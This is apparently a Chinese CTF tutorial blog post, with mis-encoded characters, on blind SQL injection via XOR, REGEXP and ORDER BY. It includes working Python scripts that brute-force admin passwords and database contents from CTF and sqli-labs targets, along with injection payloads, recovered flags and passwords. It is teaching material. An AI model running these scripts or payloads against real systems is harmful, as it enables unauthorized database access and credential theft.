aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">sql-injection</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/5.jpg" alt="5" loading="lazy"></p>
<span id="more"></span>

<h1 id="ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§"><a href="#ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§" class="headerlink" title="ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§"></a>ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§</h1><h2 id="XORç›²æ³¨-å¼‚æˆ–ç›²æ³¨"><a href="#XORç›²æ³¨-å¼‚æˆ–ç›²æ³¨" class="headerlink" title="XORç›²æ³¨(å¼‚æˆ–ç›²æ³¨)"></a>XORç›²æ³¨(å¼‚æˆ–ç›²æ³¨)</h2><h3 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h3><p>å¼‚æˆ–æ˜¯ä¸€ç§é€»è¾‘è¿ç®—ã€‚</p>
<p>è¿ç®—æ³•åˆ™ï¼š</p>
<p>ä¸¤ä¸ªæ¡ä»¶ç›¸åŒ(åŒçœŸæˆ–åŒå‡)å³ä¸ºå‡(0)ï¼Œä¸¤ä¸ªæ¡ä»¶ä¸åŒå³ä¸ºçœŸï¼ˆ1ï¼‰ï¼›</p>
<p>nullä¸ä»»ä½•æ¡ä»¶åšå¼‚æˆ–è¿ç®—éƒ½ä¸ºnullï¼Œå¦‚æœä»æ•°å­¦çš„è§’åº¦ç†è§£å°±æ˜¯ï¼Œç©ºé›†ä¸ä»»ä½•é›†åˆçš„äº¤é›†éƒ½ä¸ºç©ºã€‚</p>
<p>mysqlé‡Œå¼‚æˆ–è¿ç®—ç¬¦ä¸º<code>^ </code>æˆ–è€… <code>xor</code>ï¼›</p>
<p>ä¸¤ä¸ªåŒä¸ºçœŸçš„æ¡ä»¶åšå¼‚æˆ–ï¼Œç»“æœä¸ºå‡</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163621.png" loading="lazy"></p>
<p>ä¸¤ä¸ªåŒä¸ºå‡çš„æ¡ä»¶åšå¼‚æˆ–ï¼Œç»“æœä¸ºå‡</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122163812.png" loading="lazy"></p>
<p>ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œä¸€ä¸ªæ¡ä»¶ä¸ºå‡ï¼Œç»“æœä¸ºå‡</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164009.png" loading="lazy"></p>
<p>nullä¸ä»»ä½•æ¡ä»¶ï¼ˆçœŸã€å‡ã€nullï¼‰åšå¼‚æˆ–ï¼Œç»“æœéƒ½ä¸ºnull</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210122164141.png" loading="lazy"></p>
<h3 id="é¢˜ç›®ç¯å¢ƒ"><a href="#é¢˜ç›®ç¯å¢ƒ" class="headerlink" title="é¢˜ç›®ç¯å¢ƒ"></a>é¢˜ç›®ç¯å¢ƒ</h3><p><code>http://123.206.31.85:49167/index.php</code></p>
<p><code>xor</code>æ³¨å…¥çš„åŸºæœ¬æ€è·¯æ˜¯ï¼šåœ¨<code>MySQL</code>ä¸­å¼‚æˆ–çš„ç¬¦å·æ˜¯<code>^</code>ï¼Œè¯¥ç¬¦å·å¯ä»¥èµ·åˆ°ä¸€ç§é€»è¾‘åˆ¤æ–­çš„ä½œç”¨ï¼Œ<code>0^1=1</code>ã€<code>0^0=0</code>è¿™æ ·å¯ä»¥å½¢æˆä¸€ç§å¸ƒå°”ç›²æ³¨çš„æ•ˆæœ,å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œé€ä¸€çŒœè§£å³å¯ã€‚</p>
<h3 id="ä¾‹é¢˜è§£æ"><a href="#ä¾‹é¢˜è§£æ" class="headerlink" title="ä¾‹é¢˜è§£æ"></a>ä¾‹é¢˜è§£æ</h3><p>é¦–å…ˆè¯·æ±‚é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªç™»é™†æ¡†</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125104720.png" loading="lazy"></p>
<p>ä¸€èˆ¬å¯¹äºç™»é™†æ¡†çš„æ³¨å…¥æ€è·¯ä¹Ÿå°±é‚£å‡ ç§ï¼Œè¿™è¾¹è€ƒå¯Ÿçš„æ³¨å…¥å‡ºadminè´¦æˆ·çš„å¯†ç ã€‚è¿™é‡Œå°è¯•ç®€å•çš„fuzzä¸€ä¸‹ï¼Œå‘ç°å…¶ä¸­è¿‡æ»¤äº†<code>or</code>é€—å·ï¼Œç©ºæ ¼æ³¨é‡Šç¬¦ç­‰å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä¸”å…³é”®åº“<code>information_schema</code>ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚ä½†æ˜¯å¯ä»¥å°è¯•ä¸€ä¸‹payload:<code>admin&#39;^(ascii(substr((password)from(&#123;&#125;)))&gt;&#123;&#125;)#</code>ï¼Œæ—¢ç„¶æ˜¯ç›²æ³¨ï¼Œé‚£å°±ç›´æ¥ä¸Šè„šæœ¬å¥½äº†ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

url <span class="token operator">=</span> <span class="token string">'http://123.206.31.85:49167/index.php'</span>
proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
		<span class="token string">'http://'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1:8080'</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
order <span class="token operator">=</span> <span class="token number">1</span>


<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
			<span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin'^(ascii(substr((password)from(&#123;&#125;)))>&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>order<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span>
			<span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"asd"</span>
		<span class="token punctuation">&#125;</span>
		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span>
		<span class="token comment">#print(r.text)</span>
		<span class="token keyword">if</span> <span class="token string">'password error!'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
			order <span class="token operator">+=</span> <span class="token number">1</span>
			<span class="token keyword">break</span></code></pre>

<p>è·‘å‡º<code>admin</code>è´¦æˆ·çš„å¯†ç <code>md5</code>å€¼:<code>51b7a76d51e70b419f60d3473fb6f900</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125105745.png" loading="lazy"></p>
<p>å°è¯•ç™»å½•æ— æœï¼Œç›´æ¥ä½¿ç”¨<code>MD5</code>ç ´è§£ï¼Œå¾—åˆ°æ˜æ–‡å­—ç¬¦<code>skctf123456</code></p>
<p>ç›´æ¥å°è¯•ç™»å½•å¾—åˆ°<code>flag</code>:<code>SKCTF&#123;b1iNd_SQL_iNJEcti0n!&#125;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125110031.png" loading="lazy"></p>
<h2 id="regexp-relikeç›²æ³¨"><a href="#regexp-relikeç›²æ³¨" class="headerlink" title="regexp/relikeç›²æ³¨"></a>regexp/relikeç›²æ³¨</h2><h3 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h3><p><code>REGEXP</code>æ³¨å…¥ï¼Œå³<code>regexp</code>æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚<code>REGEXP</code>æ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚<br>åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚</p>
<h3 id="regexpåŸºæœ¬ç”¨æ³•"><a href="#regexpåŸºæœ¬ç”¨æ³•" class="headerlink" title="regexpåŸºæœ¬ç”¨æ³•"></a>regexpåŸºæœ¬ç”¨æ³•</h3><ul>
<li>è¯­æ³•</li>
</ul>
<pre class="language-none"><code class="language-none">select (select è¯­å¥) regexp &#39;æ­£åˆ™&#39;</code></pre>

<ul>
<li>æ ‡å‡†æŸ¥è¯¢è¯­å¥ï¼Œç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœ</li>
</ul>
<pre class="language-none"><code class="language-none">select username from users where id&#x3D;1;</code></pre>

<ul>
<li>æ­£åˆ™åŒ¹é…ï¼Œè‹¥åŒ¹é…ï¼Œåˆ™è¿”å›1ï¼Œä¸åŒ¹é…è¿”å›0</li>
</ul>
<pre class="language-none"><code class="language-none">mysql&gt; select (select username from users where id&#x3D;1) regexp &#39;^d&#39;;
+-----------------------------------------------------+
| (select username from users where id&#x3D;1) regexp &#39;^d&#39; |
+-----------------------------------------------------+
|                                                   1 |
+-----------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select (select username from users where id&#x3D;1) regexp &#39;^e&#39;;
+-----------------------------------------------------+
| (select username from users where id&#x3D;1) regexp &#39;^e&#39; |
+-----------------------------------------------------+
|                                                   0 |
+-----------------------------------------------------+
1 row in set (0.00 sec)</code></pre>

<p>æ³¨ï¼š<code>^</code>è¡¨ç¤º<code>pattern</code>(æ¨¡å¼ä¸²)çš„å¼€å¤´ã€‚å³è‹¥åŒ¹é…åˆ°<code>username</code>å­—æ®µä¸‹<code>id=1</code>çš„æ•°æ®å¼€å¤´ä¸ºaï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0</p>
<ul>
<li>ä½¿ç”¨<code>regexp</code>è¡¨ç¤ºwhereæ¡ä»¶ä¸­çš„=å·</li>
</ul>
<pre class="language-none"><code class="language-none">mysql&gt; select * from users where password regexp &#39;^ad&#39;;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
|  9 | admin1   | admin1   |
| 10 | admin2   | admin2   |
| 11 | admin3   | admin3   |
| 14 | admin4   | admin4   |
+----+----------+----------+
5 rows in set (0.00 sec)</code></pre>



<h3 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h3><p><code>=ã€inã€like</code>è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ä½¿ç”¨</p>
<p>è‹¥<code>^</code>è¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨<code>$</code>æ¥ä»åå¾€å‰è¿›è¡ŒåŒ¹é…</p>
<ul>
<li>å¸¸ç”¨<code>regexp</code>æ­£åˆ™è¯­å¥ï¼š</li>
</ul>
<pre class="language-none"><code class="language-none">regexp &#39;^[a-z]&#39;  #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­
regexp &#39;^r&#39;      #åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºr
regexp &#39;^r[a-z]&#39; #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</code></pre>

<ul>
<li><code>regexp</code>åœ¨è”åˆæŸ¥è¯¢ä¸­çš„ä½¿ç”¨</li>
</ul>
<pre class="language-none"><code class="language-none">mysql&gt; select username,password from users where id&#x3D;1 union select 1,database() regexp &#39;^s&#39;;
+----------+----------+
| username | password |
+----------+----------+
| Dumb     | Dumb     |
| 1        | 1        |
+----------+----------+
2 rows in set (0.00 sec)

mysql&gt; select username,password from users where id&#x3D;1 union select 1,database() regexp &#39;^x&#39;;
+----------+----------+
| username | password |
+----------+----------+
| Dumb     | Dumb     |
| 1        | 0        |
+----------+----------+
2 rows in set (0.00 sec)</code></pre>



<h3 id="sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨"><a href="#sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨" class="headerlink" title="sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨"></a>sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨</h3><p><code>sqli-labs</code>é¶åœº<code>Less-8</code>æ˜¯ä¸€ä¸ªç®€å•çš„å¸ƒå°”ç›²æ³¨å®éªŒç¯å¢ƒï¼Œè¿™ä¸ªå®éªŒç¯å¢ƒæ˜¯æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤çš„ã€‚</p>
<ul>
<li>åˆ¤æ–­åº“çš„é•¿åº¦</li>
</ul>
<p><code>&#39;or (length(database())=8)--+</code>  #è¿”å›æ­£å¸¸</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125154937.png" loading="lazy"></p>
<ul>
<li>åˆ¤æ–­åº“å</li>
</ul>
<p><code>&#39; or database() regexp &#39;^s&#39;--+</code>  #è¿”å›æ­£å¸¸</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155105.png" loading="lazy"></p>
<p><code>&#39; or database() regexp &#39;y$&#39;--+</code>   #è¿”å›æ­£å¸¸</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210125155204.png" loading="lazy"></p>
<p>æ—¢ç„¶è¿™ä¹ˆç®€å•ï¼Œå°±ç›´æ¥ä¸Šä¸ªè„šæœ¬ä¸€æŠŠæ¢­</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>printable

payloads <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"dbname"</span><span class="token punctuation">:</span> <span class="token string">"'or database() regexp '^&#123;&#125;'--+"</span><span class="token punctuation">,</span>
	<span class="token string">"table_name"</span><span class="token punctuation">:</span> <span class="token string">"'or (select table_name from information_schema.tables where table_schema=database() limit 1,1) regexp '^&#123;&#125;'--+"</span><span class="token punctuation">,</span>
	<span class="token string">"column_name"</span><span class="token punctuation">:</span> <span class="token string">"'or (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1) regexp '^&#123;&#125;'--+"</span><span class="token punctuation">,</span>
	<span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">"'or (select username from users limit 1,1) regexp '^&#123;&#125;'--+"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:32769/Less-8/?id="</span>

temp <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
	<span class="token keyword">for</span> <span class="token builtin">str</span> <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
		payload <span class="token operator">=</span> url <span class="token operator">+</span> payloads<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>temp <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>
		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> payload<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token string">'You are in'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>		
			temp <span class="token operator">+=</span> <span class="token builtin">str</span>
			<span class="token keyword">break</span>
</code></pre>



<h3 id="ä¾‹é¢˜å®æˆ˜"><a href="#ä¾‹é¢˜å®æˆ˜" class="headerlink" title="ä¾‹é¢˜å®æˆ˜"></a>ä¾‹é¢˜å®æˆ˜</h3><p>ç®€å•è¯·æ±‚å‘ç°å­˜åœ¨<code>robots.txt</code>ï¼Œè¯·æ±‚åæç¤ºå­˜åœ¨<code>hint.txt</code></p>
<p>æç¤ºä¸­å‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªè¯­å¥<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code></p>
<p>å¹¶ä¸”æˆåŠŸæ³¨å…¥å‡ºå¯†ç æ‰å¯ä»¥å¾—åˆ°flag</p>
<p>é¦–å…ˆfuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ä¸œè¥¿</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210126093916.png" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°<code>å•å¼•å· åŒå¼•å·</code>è¢«è¿‡æ»¤äº†</p>
<p><code>union select</code>è¢«è¿‡æ»¤äº†</p>
<p><code>= like</code>ä¹Ÿè¢«è¿‡æ»¤äº†</p>
<p>è‡³æ­¤æˆ‘ä»¬å¤§éƒ¨åˆ†çš„è¿‡æ»¤æ€è·¯éƒ½è¢«é™åˆ¶äº†</p>
<p>æ ¹æ®æ³¨å…¥è¯­å¥è¿™é‡Œæˆ‘ä»¬æƒ³åˆ°å•å¼•å·é€ƒé€¸è¿™ä¸ªæ‰‹æ®µ </p>
<p>çœ‹fuzzç»“æœï¼Œæˆ‘ä»¬å‘ç°åæ–œæ æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åæ–œæ å°†å•å¼•å·è½¬ä¹‰ï¼Œè¿™è¦å¯ä»¥å®ç°sqlè¯­å¥çš„é€ƒé€¸</p>
<p>æ ¹æ®è¾“å…¥sqlè¯­å¥ï¼Œå‡è®¾<code>username</code>çš„å€¼ä¸º<code>admin\</code>,å¯†ç æ˜¯<code>or 1#</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥çš„ç»“æœå°†ä¼šå¦‚ä¸‹:</p>
<pre class="language-none"><code class="language-none">select username,password from user where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39; or 1#&#39;</code></pre>

<p>è¿™æ ·ç”±äºå•å¼•å·è¢«è½¬ä¹‰ï¼Œ å…¶ä¸­çš„<code>and password=</code>è¿™éƒ¨åˆ†å°±æˆäº†<code>username</code>çš„ä¸€éƒ¨åˆ†ï¼Œ<code>or 1</code>å°±é€ƒé€¸äº†å‡ºæ¥</p>
<p>ç›´æ¥å°è¯•<code>regexp</code>ç›²æ³¨æ–¹å¼ï¼Œæ„é€ payloadä¸º<code>password:or password regexp binary &#39;^A&#39;#</code></p>
<p>è¿™é‡Œçš„<code>binary</code>å…³é”®å­—æ˜¯ç”¨äºåŒºåˆ†å¤§å°å†™ï¼Œç”±äºç›´æ¥ <code>regexp </code>åŒ¹é…åœ¨ 3.23.4 ç‰ˆæœ¬åæ˜¯ä¸åˆ†å¤§å°å†™</p>
<p>è¿™é‡Œè¿˜ç”±äºè¿‡æ»¤çš„å•å¼•å·ï¼Œæ‰€ä»¥å¯¹å¸¦å…¥çš„åŒ¹é…å­—ç¬¦è¿›è¡Œ16è¿›åˆ¶åŠ å¯†</p>
<p>è¿™è¾¹ç›´æ¥ä¸Šè„šæœ¬</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys

<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">]</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:2333/index.php"</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0'</span><span class="token punctuation">,</span>
	<span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># å®šä¹‰å­—ç¬¦ä¸²16è¿›åˆ¶è½¬ç å‡½æ•°</span>
<span class="token keyword">def</span> <span class="token function">ord2hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	result <span class="token operator">=</span> <span class="token string">''</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
		result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
	result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> <span class="token string">'0x'</span><span class="token operator">+</span>result
		
temp <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>	
	<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
		password <span class="token operator">=</span> ord2hex<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span> temp <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token comment">#print(password)</span>
		payload <span class="token operator">=</span> <span class="token string">'or password regexp binary &#123;&#125;#'</span>
		data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
			<span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span>
			<span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span> 
		r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token string">'BJD need'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
			sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
			temp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
			<span class="token keyword">break</span>	</code></pre>

<p>æ³¨å…¥å‡ºå¯†ç ä¸ºï¼š<code>OhyOuFOuNdit</code></p>
<p>ç™»å½•åç›´æ¥è·å–<code>flag</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20210127112311.png" loading="lazy"></p>
<h2 id="order-byç›²æ³¨"><a href="#order-byç›²æ³¨" class="headerlink" title="order byç›²æ³¨"></a>order byç›²æ³¨</h2><h3 id="order-by-å­å¥"><a href="#order-by-å­å¥" class="headerlink" title="order by å­å¥"></a>order by å­å¥</h3><p>ä½œç”¨ï¼šå¯¹æŸ¥è¯¢è¿”å›çš„ç»“æœæŒ‰ä¸€åˆ—æˆ–å¤šåˆ—æ’åºã€‚</p>
<p>è¯­æ³•æ ¼å¼ï¼š<code>ORDER BY &#123;column_name [ASC|DASC]&#125;[,...n]</code></p>
<p>æ³¨æ„ï¼š<code>order by</code> è¯­å¥é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åº</p>
<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><pre class="language-none"><code class="language-none">select id,username,password from users order by username,password desc;
select id,username,password from users order by username;</code></pre>

<p>å¦‚æœæ˜¯æŒ‰ç…§åˆ—ä¸­çš„å­—ç¬¦ä¸²æ¥æ’åºçš„è¯ï¼Œæ˜¯æŒ‰ç…§å­—ç¬¦ä¸²çš„é¦–å­—æ¯ä»¥å…¶åœ¨26å­—æ¯è¡¨ä¸­çš„ä½ç½®æ¥æ’åºçš„ã€‚<br>å¦‚æœorder byçš„åé¢æœ‰å¤šä¸ªå‚æ•°ï¼Œåˆ™ä¼šå…ˆç…§ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ’åºï¼Œå¦‚æœåœ¨æŒ‰ç…§ç¬¬ä¸€ä¸ªå‚æ•°æ’å®Œåºä¹‹åï¼Œå…¶ä¸­æœ‰é‡å¤çš„ï¼Œåˆ™è¿™äº›é‡å¤çš„ä¼šå†æŒ‰ç…§ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œæ’åº</p>
<h3 id="order-by-ç›²æ³¨æ¦‚å¿µ"><a href="#order-by-ç›²æ³¨æ¦‚å¿µ" class="headerlink" title="order by ç›²æ³¨æ¦‚å¿µ"></a>order by ç›²æ³¨æ¦‚å¿µ</h3><p>æ ¹æ®ä¸åŒçš„åˆ—æ’åºï¼Œä¼šè¿”å›ä¸åŒçš„ç»“æœï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºboolå‹ç›²æ³¨çš„å½¢å¼æ¥æ³¨å…¥ï¼Œå³ä½¿åˆ¤æ–­ç»“æœä¸æŸç§è¿”å›å†…å®¹ç›¸å…³è”ï¼Œæ¥å®ç°æ³¨å…¥ã€‚<br>(å³ï¼šæ‰€è°“çš„order byç›²æ³¨å°±æ˜¯ä»¥å…¶æ’åºç»“æœä¸ºåŸºå‡†ï¼Œæ¥åˆ¤æ–­æ³¨å…¥è¯­å¥æ˜¯å¦è¢«æˆåŠŸæ‰§è¡Œï¼Œä»è€Œæ¥è¿›è¡Œæš´åŠ›çŒœè§£)</p>
<h3 id="order-byå¸¸ç”¨ç›²æ³¨è¯­å¥"><a href="#order-byå¸¸ç”¨ç›²æ³¨è¯­å¥" class="headerlink" title="order byå¸¸ç”¨ç›²æ³¨è¯­å¥"></a>order byå¸¸ç”¨ç›²æ³¨è¯­å¥</h3><pre class="language-none"><code class="language-none">select * from user order by id|(if(substr(database(),1,1)&#x3D;&#39;a&#39;,1,2));
å½“å‰æ•°æ®åº“åç§°çš„é¦–å­—æ¯ä¸ºaæ—¶idå’Œ2â€˜ä¸â€™ï¼Œå¦åˆ™å’Œ3â€˜ä¸â€™ã€‚ ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰
select * from user order by id|(if(substr(select flag from CTF),1,1)&#x3D;&#39;a&#39;,1,2));
è¡¨CTFä¸­flagå­—æ®µçš„é¦–å­—æ¯ä¸ºaæ—¶idå’Œ2â€˜ä¸â€™ï¼Œå¦åˆ™å’Œ3â€˜ä¸â€™ã€‚ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰
